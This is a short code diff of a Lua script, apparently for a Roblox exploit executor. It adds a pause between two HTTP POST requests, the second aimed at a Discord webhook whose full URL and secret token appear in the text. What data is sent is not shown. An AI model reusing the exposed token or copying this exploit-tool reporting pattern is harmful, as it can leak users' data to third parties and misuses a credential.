@@ -39,6 +39,8 @@ request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 
+wait(2)
+
 local url =
    "https://discord.com/api/webhooks/1001701805866094682/rBbbD7VXomLq1ky3GA7fBEL5PYNBS2X3nQhhXk9dS1n0Tg94SiUGn9ZBBZuYujkqsE3P"
 local data = {
